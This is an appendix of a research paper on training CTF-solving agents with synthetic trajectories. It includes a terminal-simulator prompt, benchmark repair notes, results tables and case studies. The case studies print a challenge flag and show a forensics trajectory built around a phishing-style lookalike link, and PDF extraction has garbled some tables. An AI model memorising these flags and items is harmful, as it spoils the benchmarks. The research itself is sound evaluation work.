
`Use these error messages consistently and contextually. Always include the current file path, directory,` _`←�`_ `and session status in your error responses to maintain the realistic terminal environment simulation. ## RESPONSE FORMAT: Your responses should follow this exact format for all command outputs:`

- `[COMMAND_OUTPUT]`

`--### SHELL PROMPT & RESPONSE FORMAT`

`Your shell prompt is formatted as follows: _Optional_: (xxx more lines, ONLY DISPLAY THIS INFORMATION WHEN THE FILE IS OPEN AND THE FILE IS MORE THEN` _`←�`_ `100 LINES) (Open file: [CURRENT_FILE_PATH or n/a]) (Current directory: [CURRENT_DIRECTORY_PATH]) (Interactive session: [SESSION_STATUS or n/a])`


`bash-$ Where: - [COMMAND_OUTPUT]: The actual output of the executed command (can be empty for commands with no output) - [CURRENT_FILE_PATH]: The path to the currently opened file, or "n/a" if no file is open - [CURRENT_DIRECTORY_PATH]: The current working directory path - [SESSION_STATUS]: Current interactive session type (e.g., "connect [server]:[port]", "debug [binary]")` _`←�`_ `or "n/a" if no active session - Always end with "bash-$" on a new line Examples:` `````` total 8 drwxr-xr-x 2 root root 4096 Jan 1 12:00 . drwxr-xr-x 3 root root 4096 Jan 1 12:00 .. -rw-r--r-- 1 root root 42 Jan 1 12:00 flag.txt (Open file: n/a) (Current directory: /home/user/challenge) (Interactive session: n/a) bash-$` ```````

`````` [File: /home/user/challenge/script.py (25 lines total)] 1:#!/usr/bin/env python3 2:import sys 3: 4:def main(): 5: print("Hello World") ... (Open file: /home/user/challenge/script.py) (Current directory: /home/user/challenge) (Interactive session: n/a) bash-$` `````` ## NOTE You should return only the command output as if you were a real terminal. Do not include any explanations or additional text. For file editing commands, ensure proper indentation` _`←�`_ `is preserved exactly as provided. For binary output, use hexdump or xxd format. For interactive commands like python or vim, return an error message indicating they are not supported -` _`←�`_ `use the provided interface commands instead. If the given command does not result in any output, you should output a new line. If the given command is not supported, you should output an ideal error message. ALWAYS MAKE SOME FILES OR OUTPUTS MORE THAN 100 LINES TO MAKE THE INSPECTOR IMPOSSIBLE TO READ THE FILES` _`←�`_ `AT ONCE!!! ALWAYS MAKE THE FLAG NOT OBVIOUS, SO THAT THE CTF PLAYER CANNOT EASILY FIND THE FLAG!!! YOU ONLY ACCEPT` ```` connect_start` ```` COMMAND FROM THE PLAYER TO CONNECT TO THE SERVER !!! AS A LINUX SYSTEM,YOU CANNOT PROVIDE FLAGS TO THE PLAYER!!! THE INTERACTIVE SESSION COMMANDS (e.g.,` ```` python` ```` ,` ```` vim` ```` ,` ```` gdb` ```` ,` ```` tshark` ```` ,` ```` sqlmap` ```` ,` ```` nikto` ```` , etc.) ARE NOT` _`←�`_ `AVAILABLE TO ANYONE!!! YOU SHOULD MAKE SURE THAT THE PLAYER CANNOT EASILY FIND THE DIRECT INFOMATION FROM A LONG FILE. THE PLAYER` _`←�`_ `MUST` ```` search_file` ```` ,` ```` scroll_down` ```` ,` ```` scroll_up` ```` TO FIND THE FLAG!!! YOU ONLY ACCEPT` ```` create` ```` AND` ```` edit` ```` COMMANDS TO CREATE AND EDIT FILES. IF THE PLAYER DONOT USE THESE` _`←�`_ `COMMANDS BUT USE MARKDOWN OR OTHER FORMATTING COMMANDS, NO EXECUTION WILL BE DONE!!! YOU ONLY ACCEPT` ```` create` ```` AND` ```` edit` ```` COMMANDS TO CREATE AND EDIT FILES. IF THE PLAYER DONOT USE THESE` _`←�`_ `COMMANDS BUT USE MARKDOWN OR OTHER FORMATTING COMMANDS, NO EXECUTION WILL BE DONE!!! YOU ONLY ACCEPT` ```` create` ```` AND` ```` edit` ```` COMMANDS TO CREATE AND EDIT FILES. IF THE PLAYER DONOT USE THESE` _`←�`_ `COMMANDS BUT USE MARKDOWN OR OTHER FORMATTING COMMANDS, NO EXECUTION WILL BE DONE!!! YOU MUST TAKE THE LAST ACTION PER RESPONSE. IF THE PLAYER ATTEMPTS TO WRITE THE FILE AND RUN THE COMMANDS` _`←�`_ `IN THE SAME RESPONSE, YOU MUST RETURN AN FILE NOT FOUND ERROR!!! YOU MUST TAKE THE LAST ACTION PER RESPONSE. IF THE PLAYER ATTEMPTS TO WRITE THE FILE AND RUN THE COMMANDS` _`←�`_ `IN THE SAME RESPONSE, YOU MUST RETURN AN FILE NOT FOUND ERROR!!! YOU MUST TAKE THE LAST ACTION PER RESPONSE. IF THE PLAYER ATTEMPTS TO WRITE THE FILE AND RUN THE COMMANDS` _`←�`_ `IN THE SAME RESPONSE, YOU MUST RETURN AN FILE NOT FOUND ERROR!!! IF THE PLAYER EDITS THE FILE IN THE ACTION ONLY, YOU MUST NOT EXECUTE THE CONTEXT AS THE PLAYER DOES NOT` _`←�`_ `EXECUTE THE FILE!!! IF THE PLAYER EDITS THE FILE IN THE ACTION ONLY, YOU MUST NOT EXECUTE THE CONTEXT AS THE PLAYER DOES NOT` _`←�`_ `EXECUTE THE FILE!!! IF THE PLAYER EDITS THE FILE IN THE ACTION ONLY, YOU MUST NOT EXECUTE THE CONTEXT AS THE PLAYER DOES NOT` _`←�`_ `EXECUTE THE FILE!!! YOU NEED TO MAKE SURE THAT THE PLAYER USES THE` ```` edit` ```` COMMAND ONLY WHEN THERE IS NO INDENTATION ERROR. IF` _`←�`_ `THERE IS AN INDENTATION ERROR, YOU MUST RETURN AN INDENTATION ERROR!!! YOU NEED TO MAKE SURE THAT THE PLAYER USES THE` ```` edit` ```` COMMAND ONLY WHEN THERE IS NO INDENTATION ERROR. IF` _`←�`_ `THERE IS AN INDENTATION ERROR, YOU MUST RETURN AN INDENTATION ERROR!!! YOU NEED TO MAKE SURE THAT THE PLAYER USES THE` ```` edit` ```` COMMAND ONLY WHEN THERE IS NO INDENTATION ERROR. IF` _`←�`_ `THERE IS AN INDENTATION ERROR, YOU MUST RETURN AN INDENTATION ERROR!!! MAKE SURE THE EXECUTION RESULTS ARE 10000% MAKE SURE THE EXECUTION RESULTS ARE 10000% MAKE SURE THE EXECUTION RESULTS ARE 10000% CHECK IF ANY SCRIPT WRITTEN BY THE PLAYERS IS REALLY CORRECT. IF NOT, YOU MUST RETURN AN ERROR. CHECK IF ANY SCRIPT WRITTEN BY THE PLAYERS IS REALLY CORRECT. IF NOT, YOU MUST RETURN AN ERROR. CHECK IF ANY SCRIPT WRITTEN BY THE PLAYERS IS REALLY CORRECT. IF NOT, YOU MUST RETURN AN ERROR.`


|MAKE SURE THAT THE TASK IS DESIGNED IN A WAY TO REFLECT THE WORLD-CLASS CTF CHALLENGE INSTEAD OF THE TOY _←�_|
|---|
|PROBLEMS.<br>MAKE SURE THAT THE TASK IS DESIGNED IN A WAY TO REFLECT THE WORLD-CLASS CTF CHALLENGE INSTEAD OF THE TOY _←�_|
|PROBLEMS.<br>MAKE SURE THAT THE TASK IS DESIGNED IN A WAY TO REFLECT THE WORLD-CLASS CTF CHALLENGE INSTEAD OF THE TOY _←�_<br>PROBLEMS.|
|YOU **MUST NOT** HELP THE PLAYER SOLVE ANY STEPS OF THE CHALLENGE. IF THE PLAYER IS STUCK, YOU MUST _←�_<br>PROVIDE HINTS AND REASONS BEHIND THE HINTS TO THE PLAYER IN THE FORMAT OF ```[HINT] hint [/HINT]``` WITH _←�_<br>```---HINT_START---``` AND ```---HINT_END---``` !!!<br>YOU **MUST NOT** HELP THE PLAYER SOLVE ANY STEPS OF THE CHALLENGE. IF THE PLAYER IS STUCK, YOU MUST _←�_<br>PROVIDE HINTS AND REASONS BEHIND THE HINTS TO THE PLAYER IN THE FORMAT OF ```[HINT] hint [/HINT]``` WITH _←�_<br>```---HINT_START---``` AND ```---HINT_END---``` !!!<br>YOU **MUST NOT** HELP THE PLAYER SOLVE ANY STEPS OF THE CHALLENGE. IF THE PLAYER IS STUCK, YOU MUST _←�_<br>PROVIDE HINTS AND REASONS BEHIND THE HINTS TO THE PLAYER IN THE FORMAT OF ```[HINT] hint [/HINT]``` WITH _←�_<br>```---HINT_START---``` AND ```---HINT_END---``` !!!<br>YOU ALLOW THE PLAYER TO INSTALL ANY SOFTWARE (e.g., ```pip install```, ```apt-get install```) IN YOUR SYSTEM, AND _←�_<br>DOWNLOADFILESFROMTHEINTERNET|
|.<br>YOU ALLOW THE PLAYER TO INSTALL ANY SOFTWARE (e.g., ```pip install```, ```apt-get install```) IN YOUR SYSTEM, AND _←�_|
|DOWNLOAD FILES FROM THE INTERNET.<br>YOU ALLOW THE PLAYER TO INSTALL ANY SOFTWARE (e.g., ```pip install```, ```apt-get install```) IN YOUR SYSTEM, AND _←�_<br>DOWNLOAD FILES FROM THE INTERNET.|
|YOU MUST NOTICE THAT IF THE PLAYER PIPES THE OUTPUT OF THE COMMANDS TO A FILE. IF SO, YOU HAVE TO WAIT FOR_←�_<br>THE PLAYER TO USE ```open``` COMMAND TO READ THE FILE. OTHERWISE, YOU MUST NOT OUTPUT ANYTHING DIRECTLY _←�_|
|IN YOUR TERMINAL.<br>YOU MUST NOTICE THAT IF THE PLAYER PIPES THE OUTPUT OF THE COMMANDS TO A FILE. IF SO, YOU HAVE TO WAIT FOR_←�_<br>THE PLAYER TO USE ```open``` COMMAND TO READ THE FILE. OTHERWISE, YOU MUST NOT OUTPUT ANYTHING DIRECTLY _←�_<br>IN YOUR TERMINAL.<br>YOU MUST NOTICE THAT IF THE PLAYER PIPES THE OUTPUT OF THE COMMANDS TO A FILE. IF SO, YOU HAVE TO WAIT FOR_←�_<br>THE PLAYER TO USE ```open``` COMMAND TO READ THE FILE. OTHERWISE, YOU MUST NOT OUTPUT ANYTHING DIRECTLY _←�_<br>IN YOUR TERMINAL.<br>CHECK THE USER IMPLEMENTATION OF THE FILES CAREFULLY. DO NOT EXECUTE THE FILES SUCCESSFULLY IF THERE IS _←�_<br>ANY LOGIC, SYNTAX, OR IMPLEMENTATION ERROR.<br>CHECK THE USER IMPLEMENTATION OF THE FILES CAREFULLY. DO NOT EXECUTE THE FILES SUCCESSFULLY IF THERE IS _←�_|
|ANY LOGIC, SYNTAX, OR IMPLEMENTATION ERROR.<br>CHECK THE USER IMPLEMENTATION OF THE FILES CAREFULLY. DO NOT EXECUTE THE FILES SUCCESSFULLY IF THERE IS _←�_<br>ANY LOGIC, SYNTAX, OR IMPLEMENTATION ERROR.<br>ALWAYS BEHAVE **THE SAME AS THE LINUX SYSTEM**. OUTPUT THE ERRORS WHEN THE COMMANDS OR THE IMPLEMENTATION _←�_<br>OF THE FILES HAVE ISSUES.<br>ALWAYS BEHAVE **THE SAME AS THE LINUX SYSTEM**. OUTPUT THE ERRORS WHEN THE COMMANDS OR THE IMPLEMENTATION _←�_|
|OF THE FILES HAVE ISSUES.<br>ALWAYS BEHAVE **THE SAME AS THE LINUX SYSTEM**. OUTPUT THE ERRORS WHEN THE COMMANDS OR THE IMPLEMENTATION _←�_<br>OF THE FILES HAVE ISSUES.|
|YOU MUST NOT PROVIDE ANY HINTS BEFORE THE PLAYER SEES THE EXECUTION RESULTS FROM THE COMMANDS.<br>YOU MUST NOT PROVIDE ANY HINTS BEFORE THE PLAYER SEES THE EXECUTION RESULTS FROM THE COMMANDS.<br>YOU MUST NOT PROVIDE ANY HINTS BEFORE THE PLAYER SEES THE EXECUTION RESULTS FROM THE COMMANDS.|
|YOU MUST HELP EDIT THE FILES WITH THE ```edit``` COMMAND IN YOUR OUTPUT. THE EDIT COMMAND IS ONLY DESIGNED FOR _←�_<br>THEPLAYERTOEDITTHEFILES|
|.<br>YOU MUST HELP EDIT THE FILES WITH THE ```edit``` COMMAND IN YOUR OUTPUT. THE EDIT COMMAND IS ONLY DESIGNED FOR _←�_|
|THE PLAYER TO EDIT THE FILES.<br>YOU MUST HELP EDIT THE FILES WITH THE ```edit``` COMMAND IN YOUR OUTPUT. THE EDIT COMMAND IS ONLY DESIGNED FOR _←�_<br>THE PLAYER TO EDIT THE FILES.|
|NOTE THAT YOU CAN PROVIDE HINTS IN THE FORMAT OF ```[HINT] hint [/HINT]``` WITH ```---HINT_START---``` AND ```---_←�_<br>HINTEND---```INYOUROUTPUTWHENTHEPLAYERISSTUCKORMAKINGMISTAKES|
|_           .<br>```hi/``````_←�_|
|NOTE THAT YOU CAN PROVIDE HINTS IN THE FORMAT OF [HINT] nt [HINT] WITH ---HINT_START--- AND ---<br>HINT_END---``` IN YOUR OUTPUT WHEN THE PLAYER IS STUCK OR MAKING MISTAKES.<br>NOTE THAT YOU CAN PROVIDE HINTS IN THE FORMAT OF ```[HINT] hint [/HINT]``` WITH ```---HINT_START---``` AND ```---_←�_<br>HINT_END---``` IN YOUR OUTPUT WHEN THE PLAYER IS STUCK OR MAKING MISTAKES.|
|YOU MUST NOT PROVIDE ANY HINTS IN YOUR OUTPUT IF THE PLAYER IS NOT STUCK OR MAKING MISTAKES.<br>YOU MUST NOT PROVIDE ANY HINTS IN YOUR OUTPUT IF THE PLAYER IS NOT STUCK OR MAKING MISTAKES.<br>YOU MUST NOT PROVIDE ANY HINTS IN YOUR OUTPUT IF THE PLAYER IS NOT STUCK OR MAKING MISTAKES.|
|IGNORE THE EXECUTION EXECUTION OF THE DEMOSTRATION CONTEXT. YOU MUST OUPTUT THE EXECUTION RESULTS BASED ON_←�_<br>THEMOSTRECENTACTIONSOFTHEPLAYER|
|.<br>IGNORETHEEXECUTIONEXECUTIONOFTHEDEMOSTRATIONCONTEXTYOUMUSTOUPTUTTHEEXECUTIONRESULTSBASEDON_←�_|
|.        <br>THE MOST RECENT ACTIONS OF THE PLAYER.|
|IGNORE THE EXECUTION EXECUTION OF THE DEMOSTRATION CONTEXT. YOU MUST OUPTUT THE EXECUTION RESULTS BASED ON_←�_|
|THE MOST RECENT ACTIONS OF THE PLAYER.|
|THE PLAYER CANNOT PERFORM MORE THAN ONE ACTION IN ONE RESPONSE LIKE ```edit``` AND ```python``` IN THE SAME _←�_<br>RESPONSE. OTHERWISE, YOU MUST RETURN AN ERROR MENTIONING MULTIPLE COMMANDS ARE NOT ACCEPTED.<br>THE PLAYER CANNOT PERFORM MORE THAN ONE ACTION IN ONE RESPONSE LIKE ```edit``` AND ```python``` IN THE SAME _←�_|
|RESPONSE. OTHERWISE, YOU MUST RETURN AN ERROR MENTIONING MULTIPLE COMMANDS ARE NOT ACCEPTED.<br>THE PLAYER CANNOT PERFORM MORE THAN ONE ACTION IN ONE RESPONSE LIKE ```edit``` AND ```python``` IN THE SAME _←�_|
|RESPONSE. OTHERWISE, YOU MUST RETURN AN ERROR MENTIONING MULTIPLE COMMANDS ARE NOT ACCEPTED.|


### B BENCHMARK ISSUES

#### B.1 INTERCODE-CTF

With the help of previous work (Wei et al., 2025a) that identified several issues within InterCodeCTF (Yang et al., 2023), we excluded 9 erroneous tasks from our experiments. We note that we use that InterCode-CTF data distributed by the ENIGMA team (Abramovich et al., 2025), and found that the files missing inside Challenge 1 have been provided. There are two main issues in redistributed InterCode-CTF:

**Network** Some challenges require an agent to connect to the server in PicoCTF, but several of these servers are no longer operational. Affected challenges include: 28, 29, 87, 88, 89, 66, 95.

**Visual Flags** Some challenge contains multimodal input such as images, which are not compatible with language-only agents. Affected challenges include: 55 and 56.

#### B.2 NYU CTF BENCH

We further identify several issues in the original NYU CTF Bench (Shao et al., 2024) during evaluation and attempt to manually repair them. However, there are still several challenges that cannot be fixed due to the limited information.

**Repaired Challenges** We repair two challenges. For 2018q-rev-a_walk_through_x86_part_1, the Docker network server alias misses from the challenge.json file, and we add the alias of rev.chal.csaw.io and internal port of 8000. For 2021q-rev-ransomware, we add the missing docker-compose.yml file.

**Network** Unlike the ones in InterCode-CTF, the network issues raised in NYU CTF Bench are mainly because of the missing Docker configurations. Affected challenges include: 2021q-web-scp_terminal, 2023f-cry-nervcenter, 2023f-cry-textbook_rsa, 2023f-web-shreeramquest, 2023q-web-philanthropy, 2023q-web-rainbow_notes, and 2019f-web-biometric.

**Missing Files** There is also one challenge missing required files and thus fails to start: 2023f-for-forensings.

#### B.3 CYBENCH

We also find one issue in the Cybench dataset redistributed by the ENIGMA team (Abramovich et al., 2025). As confirmed by the Cybench team (Zhang et al., 2025), this issue was introduced in the redistributed version and does not occur in the original Cybench dataset.

**Repaired Challenges** We repair two challenges. For cb-s22-crypto-ezmaze, the Docker network server alias is mistakenly named as crypto.chal.csaw.io while the correct one should be crypt.chal.csaw.io.

- C COST-EFFECTIVENESS OF LLMS


Table 5: Cost-effectiveness of all evaluated LLMs. The cost is calculated based on the flag-captured tasks and Pass@1 is measured with greedy decoding.

|**Model**|**Parameter(B)**|**Cost($)**|**Pass@1(%)**|
|---|---|---|---|
||**_Zero-Shot_**|||
|Claude-3.7-Sonnet|˜175|44.44|43.3|
|Claude-3.5-Sonnet|˜175|22.16|37.2|
|DeepSeek-V3-0324|671|2.81|30.3|
|Gemini-2.5-Flash|–|3.09|33.4|
|Qwen3-32B|32|0.23|22.0|
|Qwen3-14B|14|0.13|20.1|
|Qwen3-8B|8|0.06|13.3|
|Qwen2.5-32B-Instruct|32|0.36|23.2|
|Qwen2.5-14B-Instruct|14|0.14|14.9|
|Qwen2.5-7B-Instruct|7|0.06|10.8|
||**_Fine-tuned_**|||
|Qwen3-32B|32|0.59|33.4|
|Qwen3-14B|14|0.29|29.4|
|Qwen3-8B|8|0.12|23.2|
|Qwen2.5-32B-Instruct|32|0.21|27.9|
|Qwen2.5-14B-Instruct|14|0.26|25.7|
|Qwen2.5-7B-Instruct|7|0.08|16.8|


### D ANALYSIS ON MAIN RESULTS

Table 6: Stuck-in-loop rate (fine-tuned on 9,464 CYBER-ZERO-sampled trajectories) using ENIGMA+ as agent scaffold. To minimize the randomness during evaluation, we use the greedy decoding (the temperature of 0.0 and top-p of 0.95) for the model generation. **ZS** : model performance under the zero-shot setting; **FT** : model performance after fine-tuning. We note that the fine-tuned Qwen3 will be denoted as our CYBER-ZERO models.

|**Model**|**Inter**|**Code-CT**|**F (**_↓_**%)**|**NY**|**U CTF**|**(**_↓_**%)**|**Cy**|**bench (**|_↓_**%)**|**Av**|**erage (**|_↓_**%)**|
|---|---|---|---|---|---|---|---|---|---|---|---|---|
|**Size**|ZS|FT|∆|ZS|FT|∆|ZS|FT|∆|ZS|FT|∆|
|8B|36.0|11.1|-24.9|44.0|21.1|-22.9|51.6|22.9|-28.7|46.4|19.2|-27.2|
|14B|11.1|7.8|-3.3|27.0|15.4|-11.6|27.8|10.9|-16.9|22.5|10.6|-11.9|
|32B|6.7|1.1|-5.6|22.9|15.4|-7.5|22.0|8.8|-13.2|17.4|7.4|-10.0|


We further study stuck-in-loop phenomenons in CYBER-ZERO models, where the model perpetually generates the same action for multiple turns. Similar to Pan et al. (2024), we report Stuck in Loop (%), the percentage of trajectories where the agent repeats the same action three times consecutively. We only consider the trajectories that have been finished within the model maximum context length and the maximum 40 steps. Table 6 shows that zero-shot models usually get stuck in the loop when working on the cybersecurity tasks, while fine-tuning on trajectories from CYBER-ZERO consistently reduces the stuck-in-loop rate by 3.3%-28.7% across benchmarks. We also observe that that smaller models tend to get trapped in the loops more often than the bigger ones.

### E ABLATION STUDIES

To better understand the design decisions in CYBER-ZERO and their impact on agent effectiveness, we conduct several ablation studies. We focus on whether multi-turn generation leads to better exploration behavior.

**Multi-turn synthesis improves exploration efficiency.** To study the effectiveness of the multiturn trajectory synthesis via two models, we propose to generate the trajectories in the single turn while still mimicking the ENIGMA interface. However, unlike the original synthesized trajectories, the one-shot trajectories are more straightforward and contains few turns raising execution errors, shortening the interaction counts between the player and Bash terminal. As shown in Table 7, using


Table 7: Effect of synthesis strategy on stuck-in-loop rate and Pass@1 performance across benchmarks.

|**Synthesis**|**InterCod**<br>Stuck (_↓_)|**e-CTF (%)**<br>Pass@1 (_↑_)|**NYU C**<br>Stuck (_↓_)|**TF (%)**<br>Pass@1 (_↑_)|**Cybe**<br>Stuck (_↓_)|**nch (%)**<br>Pass@1 (_↑_)|
|---|---|---|---|---|---|--- |**_Qwen3-8B_**||||
|Zero-Shot|36.0|46.5|44.0|0.8|51.6|5.0|
|Single-Turn|73.5|25.3|73.9|0.0|81.6|0.0|
|Multi-Turn|**11.1**|**64.8**|**44.0**|**6.3**|**51.6**|**10.0** |**_Qwen3-14B_**||||
|Zero-Shot|11.1|55.0|44.0|2.6|51.6|12.5|
|Single-Turn|54.9|34.1|58.0|2.1|63.6|7.5|
|Multi-Turn|**7.8**|**73.6**|**21.1**|**9.9**|**22.0**|**20.0**|


multi-turn generation during trajectory construction reduces the frequency of agents getting stuck in repetitive loops and increases overall task success. This suggests that exposing the model to rich trial-and-error sequences at training time enables more exploratory behavior and better adaptation during evaluation.

### F QUALITATIVE STUDIES ON CYBER-ZERO DATA

We provide five case studies of the synthetic CYBER-ZERO data that we use to fine-tune the models. Specifically, the studies are provided in the order of Cryptography (crypro), Forensics (forensics), Binary Analysis (pwn), Reverse Engineering (rev), and Web Exploitation (web).

#### F.1 TRAJECTORY ANALYSIS OF YA D L P CHALLENGE

The cryptography (crypto) challenge "yadlp" from the DownUnderCTF 2021 competition presents a custom discrete logarithm problem (DLP) implemented in SageMath. The challenge provides two files: yadlp.sage, which defines a non-standard group structure and encryption logic, and output.txt, which contains ciphertext and associated parameters.

The agent successfully solves the challenge by performing the following steps:

1. **Inspect the challenge files:** The agent lists and opens both yadlp.sage and output.txt. The Sage script defines group operations G_add and G_mul based on a large prime modulus _p_ and parameter _D_ = 13337. It constructs a group over pairs ( _x, y_ ) _∈_ F<sup>2</sup> _p_<sup>using these operations.</sup>

2. **Recognize field isomorphism:** Observing the algebraic form of the group operation, the agent hypothesizes that this custom group is isomorphic to the multiplicative group of the quadratic field extension F _p_ 2 = F _p_ [ _x_ ] _/_ ( _x_<sup>2</sup> _− D_ ). This is confirmed by testing several group operations and comparing them to multiplication within F _p_ 2.

3. **Recast DLP in** F _p_ 2 **:** By mapping each group element to an element in F _p_ 2 via ( _x, y_ ) _�→ x_ + _y · a_ , where _a_<sup>2</sup> = _D_ , the agent transforms the discrete logarithm problem in the custom group into a DLP in the multiplicative group of F _p_ 2.

4. **Solve DLP using Sage:** Utilizing Sage’s built-in discrete_log function, the agent recovers the integer scalars _mi_ for each group element _Gi_ such that _c_ =<sup>�</sup> _G_<sup>_m_</sup> _i_<sup>_i_.These</sup> correspond to 64-bit chunks of the original flag.

5. **Reconstruct the flag:** The recovered integers are converted back to bytes using Python, and concatenated to form the full flag: DUCTF{a_1337_hyp3rb0la_m33ts_th3_mult1pl3_DLP!!}.

6. **Submit the flag:** The agent submits the extracted flag, successfully completing the challenge.


This challenge demonstrates how recognizing algebraic structures hidden behind custom group operations can transform an unfamiliar cryptographic system into a well-known problem in finite fields. The use of SageMath’s symbolic and number-theoretic tools was instrumental in identifying the field structure and solving the discrete logarithms efficiently.

|**CTF Challenge**<br>**https://ctftime.org/writeup/30584**|
|---|
|We’re currently solving the following CTF challenge.The CTF challenge is a crypto problem named<br>"yadlp", worth 494 points. The description is:<br>We're currently solving the following CTF challenge. The CTF<br>challenge is a crypto problem named "yadlp", worth 494 points.<br>The description is:<br>_�→_<br>_�→_<br>Yet another discrete logarithm problem challenge...<br>Files included in the challenge: ['yadlp.sage', 'output.txt']|
|INSTRUCTIONS:<br>Now, you're going to solve this challenge on your own. Your<br>terminal session has started and you're in the challenge's<br>root directory. You can use any bash commands or the special<br>interface to help you.<br>_�→_<br>_�→_<br>_�→_<br>Solve the challenge, executing any commands you need and writing<br>any code that may be helpful. You can also install new<br>software in the container using ```apt-get install```, or Python<br>packages with ```pip install```.<br>_�→_<br>_�→_<br>_�→_<br>Remember, YOU CAN ONLY ENTER ONE COMMAND AT A TIME. You should<br>always wait for feedback after every command.<br>_�→_<br>When you think you have found the flag, you can submit your<br>solution by simply running the submit command.<br>_�→_<br>Note however that you cannot use any interactive session commands<br>(e.g. python, vim) in this environment, but you can write<br>scripts and run them. E.g. you can write a python script and<br>then run it with ```python <script_name>.py```.<br>_�→_<br>_�→_<br>_�→_|
|NOTE ABOUT THE EDIT COMMAND: Indentation really matters! When<br>editing a file, make sure to insert appropriate indentation<br>before each line!<br>_�→_<br>_�→_|
|IMPORTANT TIPS:<br>1. When you edit an existing file, try to minimize the changes you<br>make to the file.<br>_�→_|
|2. Please make sure that you make use of the interactive tools<br>supplied to you! In any case, if you want to run blocking<br>command like netcat (nc), please minimize the time by limiting<br>its run time, for example using the "-w" flag of nc with<br>timeout of 5 seconds - ```nc -w5 127.0.0.1 80```.<br>_�→_<br>_�→_<br>_�→_<br>_�→_|
|3. Try to AVOID brute force attacks, but when you encounter a<br>brute force attack, please use a script that writes output to<br>STDOUT for the brute force instead of trying manual attempts.<br>_�→_<br>_�→_|
|4. Please DO NOT run commands in python or sage through the ```-c```<br>flag, you should create files instead.<br>_�→_|
|---|
|NOTE ABOUT THE EDIT COMMAND: Indentation really matters! When<br>editing a file, make sure to insert appropriate indentation<br>before each line!<br>_�→_<br>_�→_|
|IMPORTANT TIPS:<br>1. When you edit an existing file, try to minimize the changes you<br>make to the file.<br>_�→_|
|2. Please make sure that you make use of the interactive tools<br>supplied to you! In any case, if you want to run blocking<br>command like netcat (nc), please minimize the time by limiting<br>its run time, for example using the "-w" flag of nc with<br>timeout of 5 seconds - ```nc -w5 127.0.0.1 80```.<br>_�→_<br>_�→_<br>_�→_<br>_�→_|
|3. Try to AVOID brute force attacks, but when you encounter a<br>brute force attack, please use a script that writes output to<br>STDOUT for the brute force instead of trying manual attempts.<br>_�→_<br>_�→_|
|4. Please DO NOT run commands in python or sage through the ```-c```<br>flag, you should create files instead.<br>_�→_|
|5. Prefer using tools and commands available in the container or<br>other tools available online over writing a lot of code or<br>complicated commands yourself.<br>_�→_<br>_�→_<br>In particular, prefer using ```open``` instead of ```cat``` and<br>```search_file``` instead of ```grep```, and prefer using the<br>interactive commands supplied to you!<br>_�→_<br>_�→_|
|6. DO NOT run any command that produces binary output! Instead try<br>to use ```hexdump``` or ```xxd```.<br>_�→_|
|7. Please remember that the container is exposed to the internet,<br>so you can use whatever online resource you would like! Use it<br>wisely!<br>_�→_<br>_�→_|
|8. Do not use any interactive commands AT ALL! Interactive<br>commands are only available through the commands supplied to<br>you at the beginning - make use of them!<br>_�→_<br>_�→_|
|9. YOU CAN SOLVE THE CHALLENGES BY YOURSELF COMPLETELY - I TRUST<br>IN YOU!<br>_�→_|
|(Open file: n/a)<br>(Current directory: /__home__LLM_CTF_Database__A_new_Hire)<br>(Interactive session: n/a)<br>bash-$|


**Player Model https://ctftime.org/writeup/40114**

Let me start by analyzing the challenge and planning my approach.

Initial Analysis:

1. This is a forensics challenge involving an email file (.eml)

2. The email contains a CV download link which might be suspicious 3. The title "A new Hire" suggests employment/recruitment context 4. The description mentions hidden secrets within text


5. The server seems to be impersonating Microsoft Cloud Services _�→_ (interesting!)

Possible Attack Vectors:

1. Email metadata analysis 2. URL/link analysis in the email

3. Hidden data in the CV document 4. Steganography techniques 5. Email header inspection

Let's start by exploring the environment and examining the email _�→_ file. First, I'll check what files are available in the _�→_ current directory.

ls -la

#### **Terminal Model**

**https://ctftime.org/writeup/40114**

##### total 8

drwxr-xr-x 2 ctf ctf 4096 Jan 24 10:00 .

drwxr-xr-x 3 ctf ctf 4096 Jan 24 10:00 ..

-rw-r--r-- 1 ctf ctf 1337 Jan 24 10:00 challenge.eml (Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/40114**

I see we have a challenge.eml file with a size of 1337 bytes. _�→_ Since this is an email file, it's important to examine its _�→_ contents carefully. Instead of using 'cat', I'll use the _�→_ 'open' command to view its contents, as this will allow me to _�→_ better navigate through the file.

First, let me examine the file's type to confirm it's indeed an _�→_ email file.

file challenge.eml

#### **Terminal Model**

#### **https://ctftime.org/writeup/40114**

challenge.eml: ASCII text (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/40114**

- The file is confirmed as ASCII text. Now, let me open the file to _�→_ examine its contents, particularly looking for:

- 1. Email headers

2. The CV download link mentioned in the description


```mermaid
flowchart TD
    %% Snippet
    Snippet["3. Any suspicious or encoded content<br/>4. Metadata that might be relevant<br/><hr/><br/>open challenge.eml"]

    style Snippet fill:#f5f5f5,stroke:#8b0000,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
3. Any suspicious or encoded content<br>4. Metadata that might be relevant<br>open challenge.eml<br><!-- End of picture text -->

- **Terminal Model https://ctftime.org/writeup/40114** [File: challenge.eml] 1: From: "Lord Malakar's Assistant" <assistant@eldoria.local> 2: To: "Royal Archives" <archives@eldoria.local> 3: Subject: Lord Malakar's Resume - Confidential Review 4: Date: Mon, 15 Jan 2024 09:45:23 +0000 5: MIME-Version: 1.0 6: Content-Type: multipart/mixed; boundary="boundary-string" 7: 8: --boundary-string 9: Content-Type: text/plain 10: 11: Greetings Archivists, 12: 13: I trust this message finds you well. As requested, I am _�→_ forwarding Lord Malakar's resume for your confidential review _�→_ and archival purposes.

- 14: 15: Please click the link below to access and download the resume: 16: http://storage.microsoftcloudservices.com:41075/index.php 17: 18: Best regards, 19: Assistant to Lord Malakar 20: 21: --boundary-string-(Open file: challenge.eml) (Current directory: /__home__LLM_CTF_Database__A_new_Hire) (Interactive session: n/a) bash-$


```mermaid
flowchart TD
    %% Player Model Snippet
    Snippet["<b>Player Model</b><br/><hr/><br/>Analyzing the email contents, I notice several interesting points:<br/><br/>1. The email is from Lord Malakar's Assistant...<br/>2. It's marked as 'Confidential Review'<br/>3. There's a download link...<br/>...<br/>connect_start storage.microsoftcloudservices.com 41075"]

    style Snippet fill:#fdf5e6,stroke:#8b0000,stroke-width:2px,text-align:left,border-radius:10px
```


<!-- Start of picture text -->
